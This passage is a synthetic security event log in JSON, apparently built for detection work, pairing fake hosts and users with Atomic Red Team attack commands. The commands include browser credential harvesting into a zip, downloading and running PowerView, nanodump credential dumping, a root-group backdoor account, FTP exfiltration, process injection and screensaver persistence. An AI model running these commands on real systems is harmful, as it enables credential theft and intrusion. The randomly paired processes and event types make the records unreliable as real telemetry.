        "UtcTime": "2024-05-17T01:36:51.787461Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "email-46.manning.biz",
        "User": "jonesleah",
        "ProcessID": 1874,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"Mount-DiskImage -ImagePath \\\"#{path_of_iso}\\\"\\n\",",
        "LogonID": 409709,
        "LogonGuid": "2a904a08-7196-4182-8975-89d2460ca930",
        "SourceProcessID": 8827,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Program Files\\herself..dll",
        "DestinationProcessID": 9922,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Windows\\require..dll",
        "UtcTime": "2024-05-17T01:36:51.787461Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "srv-87.cannon.com",
        "User": "richardhill",
        "ProcessID": 8496,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"\\\"#{rar_exe}\\\" a -r #{output_file} #{input_path}\\\\*#{file_extension}\\n\",",
        "LogonID": 194570,
        "LogonGuid": "56d271d1-2786-4c79-af2e-ac1d1c13b6ce",
        "SourceProcessID": 4840,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\Republican..dll",
        "DestinationProcessID": 1329,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Users\\Public\\though..exe",
        "UtcTime": "2024-05-17T01:36:51.788459Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "web-21.ray-griffith.com",
        "User": "jamesgaines",
        "ProcessID": 3001,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"net user administrator /domain\\n\",",
        "LogonID": 814059,
        "LogonGuid": "fd7fe043-80a4-44d4-bf80-9770b21ba822",
        "SourceProcessID": 5278,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Program Files\\watch..exe",
        "DestinationProcessID": 9030,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Users\\Public\\those..dll",
        "UtcTime": "2024-05-17T01:36:51.788459Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "web-44.mays-weeks.com",
        "User": "bbaker",
        "ProcessID": 7126,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"$exfil_folder = \\\"$env:temp\\\\T1555.003\\\"\\nif (test-path \\\"$exfil_folder\\\") {} else {new-item -path \\\"$env:temp\\\" -Name \\\"T1555.003\\\" -ItemType \\\"directory\\\" -force}\\n$FirefoxCredsLocation = get-childitem -path \\\"$env:appdata\\\\Mozilla\\\\Firefox\\\\Profiles\\\\*.default-release\\\\\\\"\\nif (test-path \\\"$FirefoxCredsLocation\\\\key4.db\\\") {copy-item \\\"$FirefoxCredsLocation\\\\key4.db\\\" -destination \\\"$exfil_folder\\\\T1555.003Firefox_key4.db\\\"} else {}\\nif (test-path \\\"$FirefoxCredsLocation\\\\logins.json\\\") {copy-item \\\"$FirefoxCredsLocation\\\\logins.json\\\" -destination \\\"$exfil_folder\\\\T1555.003Firefox_logins.json\\\"} else {}\\nif (test-path \\\"$env:localappdata\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data\\\") {copy-item \\\"$env:localappdata\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data\\\" -destination \\\"$exfil_folder\\\\T1555.003Chrome_Login Data\\\"} else {}\\nif (test-path \\\"$env:localappdata\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data For Account\\\") {copy-item \\\"$env:localappdata\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data For Account\\\" -destination \\\"$exfil_folder\\\\T1555.003Chrome_Login Data For Account\\\"} else {}\\nif (test-path \\\"$env:appdata\\\\Opera Software\\\\Opera Stable\\\\Login Data\\\") {copy-item \\\"$env:appdata\\\\Opera Software\\\\Opera Stable\\\\Login Data\\\" -destination \\\"$exfil_folder\\\\T1555.003Opera_Login Data\\\"} else {}\\nif (test-path \\\"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\\\") {copy-item \\\"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\\\" -destination \\\"$exfil_folder\\\\T1555.003Edge_Login Data\\\"} else {} \\ncompress-archive -path \\\"$exfil_folder\\\" -destinationpath \\\"$exfil_folder.zip\\\" -force\\n\",",
        "LogonID": 614968,
        "LogonGuid": "d6e27bdd-3fc7-440d-b2ec-53244ec6290f",
        "SourceProcessID": 1174,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Windows\\factor..exe",
        "DestinationProcessID": 3448,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\high..exe",
        "UtcTime": "2024-05-17T01:36:51.788459Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "lt-05.francis.org",
        "User": "samanthagarrett",
        "ProcessID": 6067,
        "ProcessName": "nc.exe",
        "CommandLine": "\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\nanodump.x64.exe -w \\\"%temp%\\\\nanodump.dmp\\\"\\n\",",
        "LogonID": 500061,
        "LogonGuid": "5cd0ef80-ea9a-4960-a2dc-a3f08b2562a2",
        "SourceProcessID": 6559,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Windows\\threat..exe",
        "DestinationProcessID": 1452,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Windows\\style..exe",
        "UtcTime": "2024-05-17T01:36:51.788459Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "desktop-73.flowers.com",
        "User": "patricklynch",
        "ProcessID": 1066,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"g++ #{input_file} && ./a.out\\nclang++ #{input_file} && ./a.out\\n\",",
        "LogonID": 661241,
        "LogonGuid": "d7070fef-a4c0-4006-9682-2d30d29d83f5",
        "SourceProcessID": 3053,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Users\\Public\\line..dll",
        "DestinationProcessID": 4751,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Windows\\customer..dll",
        "UtcTime": "2024-05-17T01:36:51.789459Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "lt-94.hamilton-henderson.net",
        "User": "trivera",
        "ProcessID": 2944,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"sudo spctl --master-disable\\n\",",
        "LogonID": 780722,
        "LogonGuid": "eb38d499-9d2b-46ec-bb3f-b8dc81279cd4",
        "SourceProcessID": 8397,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\economic..exe",
        "DestinationProcessID": 3110,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Program Files\\specific..dll",
        "UtcTime": "2024-05-17T01:36:51.789459Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "desktop-93.russell-jones.com",
        "User": "karen74",
        "ProcessID": 3243,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"Import-Module -Name AzureAD\\n$PWord = ConvertTo-SecureString -String \\\"#{password}\\\" -AsPlainText -Force\\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \\\"#{username}\\\", $Pword\\nConnect-AzureAD -Credential $Credential\\n\\n$aadApplication = New-AzureADApplication -DisplayName \\\"#{application_name}\\\"\\n$servicePrincipal = New-AzureADServicePrincipal -AppId $aadApplication.AppId\\n#$aadApplication = Get-AzureADApplication -Filter \\\"DisplayName eq '#{application_name}'\\\"\\n\\n#Get Service Principal of Microsoft Graph Resource API \\n$graphSP = Get-AzureADServicePrincipal -Filter \\\"DisplayName eq 'Microsoft Graph'\\\"\\n\\n#Initialize RequiredResourceAccess for Microsoft Graph Resource API \\n$requiredGraphAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess\\n$requiredGraphAccess.ResourceAppId = $graphSP.AppId\\n$requiredGraphAccess.ResourceAccess = New-Object System.Collections.Generic.List[Microsoft.Open.AzureAD.Model.ResourceAccess]\\n\\n#Set Application Permissions\\n$ApplicationPermissions = @('#{application_permission}')\\n\\n$reqPermission = $graphSP.AppRoles | Where-Object {$_.Value -eq $ApplicationPermissions}\\nif($reqPermission)\\n{\\n$resourceAccess = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess\\n$resourceAccess.Type = \\\"Role\\\"\\n$resourceAccess.Id = $reqPermission.Id    \\n#Add required app permission\\n$requiredGraphAccess.ResourceAccess.Add($resourceAccess)\\n}\\nelse\\n{\\nWrite-Host \\\"App permission $permission not found in the Graph Resource API\\\" -ForegroundColor Red\\n}\\n\\n#Add required resource accesses\\n$requiredResourcesAccess = New-Object System.Collections.Generic.List[Microsoft.Open.AzureAD.Model.RequiredResourceAccess]\\n$requiredResourcesAccess.Add($requiredGraphAccess)\\n\\n#Set permissions in existing Azure AD App\\nSet-AzureADApplication -ObjectId $aadApplication.ObjectId -RequiredResourceAccess $requiredResourcesAccess\\n\\n$servicePrincipal = Get-AzureADServicePrincipal -Filter \\\"AppId eq '$($aadApplication.AppId)'\\\"\\n\\nNew-AzureADServiceAppRoleAssignment -ObjectId $servicePrincipal.ObjectId -PrincipalId $servicePrincipal.ObjectId -ResourceId $graphSP.ObjectId -Id $reqPermission.Id\\n\",",
        "LogonID": 608432,
        "LogonGuid": "82903631-9637-4bc7-8dfe-96093af3eb5a",
        "SourceProcessID": 2351,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Program Files\\your..exe",
        "DestinationProcessID": 8612,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Users\\Public\\free..dll",
        "UtcTime": "2024-05-17T01:36:51.789459Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "web-32.park.com",
        "User": "johnsonjennifer",
        "ProcessID": 5293,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"rundll32.exe ieadvpack.dll,LaunchINFSection \\\"#{inf_to_execute}\\\",DefaultInstall_SingleUser,1,\\n\",",
        "LogonID": 715606,
        "LogonGuid": "5e03f33b-bd1e-4355-b2c8-e7e085637234",
        "SourceProcessID": 7814,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Users\\Public\\court..dll",
        "DestinationProcessID": 6176,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Windows\\before..exe",
        "UtcTime": "2024-05-17T01:36:51.789459Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "web-17.camacho-anderson.info",
        "User": "janetdean",
        "ProcessID": 3265,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroup -verbose\\n\",",
        "LogonID": 301534,
        "LogonGuid": "8bc1c57e-44d3-49bc-8dd2-48deacd1110a",
        "SourceProcessID": 6283,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Program Files\\quite..exe",
        "DestinationProcessID": 8241,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Windows\\military..dll",
        "UtcTime": "2024-05-17T01:36:51.789459Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "web-88.gordon.info",
        "User": "martinday",
        "ProcessID": 6371,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"useradd -g 0 -M -d /root -s /bin/bash #{username}\\nif [ $(cat /etc/os-release | grep -i 'Name=\\\"ubuntu\\\"') ]; then echo \\\"#{username}:#{password}\\\" | sudo chpasswd; else echo \\\"#{password}\\\" | passwd --stdin #{username}; fi;\\n\",",
        "LogonID": 373526,
        "LogonGuid": "ea31f48b-aafd-4a61-9956-7d64fd93d91d",
        "SourceProcessID": 1641,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Users\\Public\\too..dll",
        "DestinationProcessID": 3741,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Users\\Public\\meeting..exe",
        "UtcTime": "2024-05-17T01:36:51.789459Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "desktop-29.cooper.org",
        "User": "zhansen",
        "ProcessID": 9843,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"import-module msonline\\n$Password = ConvertTo-SecureString -String \\\"#{password}\\\" -AsPlainText -Force\\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \\\"#{username}\\\", $Password\\nConnect-MsolService -Credential $Credential\\n$users = Get-MsolUser -All;\\nforeach($user in $users)\\n{$props = @();$user | Get-Member | foreach-object{$props+=$_.Name}; \\nforeach($prop in $props)\\n{if($user.$prop -like \\\"*password*\\\")\\n{(\\\"[*]\\\" + $user.UserPrincipalName + \\\"[\\\" + $prop + \\\"]\\\" + \\\" : \\\" + $user.$prop) | out-file -filepath $env:temp\\\\T1552.005Test1.txt -append -force}}}\\nget-content -path $env:temp\\\\T1552.005Test1.txt -erroraction silentlycontinue\\n\",",
        "LogonID": 204003,
        "LogonGuid": "95e3eabb-a9c9-4d45-8777-c977048a97e2",
        "SourceProcessID": 3637,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Users\\Public\\with..exe",
        "DestinationProcessID": 9893,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Program Files\\eat..exe",
        "UtcTime": "2024-05-17T01:36:51.790968Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "lt-62.gill-martinez.com",
        "User": "ahamilton",
        "ProcessID": 2806,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"$process = Start-Process #{spawn_process_path} -passthru\\n$PathToAtomicsFolder\\\\T1055\\\\bin\\\\x64\\\\CreateRemoteThread.exe -pid $process.Id -debug\\n\",",
        "LogonID": 322134,
        "LogonGuid": "287ae680-4192-4471-8977-798dea231b3c",
        "SourceProcessID": 4130,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Windows\\after..exe",
        "DestinationProcessID": 6670,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Program Files\\fall..dll",
        "UtcTime": "2024-05-17T01:36:51.790968Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "laptop-83.williams.com",
        "User": "collinsvirginia",
        "ProcessID": 4593,
        "ProcessName": "malware.exe",
        "CommandLine": "\"wevtutil enum-logs\"",
        "LogonID": 257685,
        "LogonGuid": "cb2eba3d-566c-45b7-9348-eab24a431e83",
        "SourceProcessID": 8492,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Windows\\phone..dll",
        "DestinationProcessID": 8278,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Users\\Public\\speak..dll",
        "UtcTime": "2024-05-17T01:36:51.790968Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "web-50.harris-brown.info",
        "User": "grahamjason",
        "ProcessID": 9438,
        "ProcessName": "malware.exe",
        "CommandLine": "\"$sampleData = \\\"Sample data for exfiltration test\\\"\\nSet-Content -Path \\\"#{sampleFile}\\\" -Value $sampleData\\n$ftpUrl = \\\"#{ftpServer}\\\"\\n$creds = Get-Credential -Credential \\\"#{credentials}\\\"\\nInvoke-WebRequest -Uri $ftpUrl -Method Put -InFile \\\"#{sampleFile}\\\" -Credential $creds\\n\",",
        "LogonID": 389237,
        "LogonGuid": "186edfdf-aa8c-44bf-bfdb-99731670ce28",
        "SourceProcessID": 8529,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Windows\\capital..dll",
        "DestinationProcessID": 6918,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Program Files\\most..dll",
        "UtcTime": "2024-05-17T01:36:51.790968Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "lt-79.thomas-williams.info",
        "User": "bakermichael",
        "ProcessID": 5537,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"docker build -t t1069 $PathtoAtomicsFolder/T1069.001/src/\\ndocker run --name t1069_container  -d -t t1069\\ndocker exec t1069_container ./test.sh\",",
        "LogonID": 960971,
        "LogonGuid": "9dba0c41-b322-4bfb-afa9-bc5cc91ee166",
        "SourceProcessID": 5538,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Program Files\\nor..exe",
        "DestinationProcessID": 7767,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Program Files\\industry..exe",
        "UtcTime": "2024-05-17T01:36:51.791978Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "web-98.walters.biz",
        "User": "mosleyscott",
        "ProcessID": 9460,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"\\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\AdFind.exe\\\" #{optional_args} -gcb -sc trustdmp\\n\",",
        "LogonID": 664732,
        "LogonGuid": "096ad6c4-835f-4512-a0bc-0c86338286e6",
        "SourceProcessID": 1625,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Windows\\benefit..exe",
        "DestinationProcessID": 1014,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Windows\\left..exe",
        "UtcTime": "2024-05-17T01:36:51.791978Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "laptop-37.jarvis.biz",
        "User": "kristenlane",
        "ProcessID": 6787,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"reg export \\\"HKEY_CURRENT_USER\\\\Control Panel\\\\Desktop\\\" %userprofile%\\\\backup.reg\\ncopy #{input_binary} \\\"%SystemRoot%\\\\System32\\\\evilscreensaver.scr\\\"\\nreg.exe add \\\"HKEY_CURRENT_USER\\\\Control Panel\\\\Desktop\\\" /v ScreenSaveActive /t REG_SZ /d 1 /f\\nreg.exe add \\\"HKEY_CURRENT_USER\\\\Control Panel\\\\Desktop\\\" /v ScreenSaveTimeout /t REG_SZ /d 60 /f\\nreg.exe add \\\"HKEY_CURRENT_USER\\\\Control Panel\\\\Desktop\\\" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f\\nreg.exe add \\\"HKEY_CURRENT_USER\\\\Control Panel\\\\Desktop\\\" /v SCRNSAVE.EXE /t REG_SZ /d \\\"%SystemRoot%\\\\System32\\\\evilscreensaver.scr\\\" /f\\nif #{reboot} NEQ 0 shutdown /r /t 0\\n\",",
        "LogonID": 177768,
        "LogonGuid": "e85591a8-9bcb-43fe-b098-0db511605885",
        "SourceProcessID": 8601,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Windows\\scientist..exe",
        "DestinationProcessID": 7803,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Users\\Public\\recognize..dll",
        "UtcTime": "2024-05-17T01:36:51.791978Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "desktop-98.randall.info",
        "User": "brandon77",
        "ProcessID": 2638,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"rm #{history_path}\\n\",",
        "LogonID": 131499,
        "LogonGuid": "614a9676-d1cf-4b1c-815f-1e28467eeb47",
        "SourceProcessID": 1278,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Program Files\\nature..dll",
        "DestinationProcessID": 8381,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\its..dll",
        "UtcTime": "2024-05-17T01:36:51.791978Z"
    },
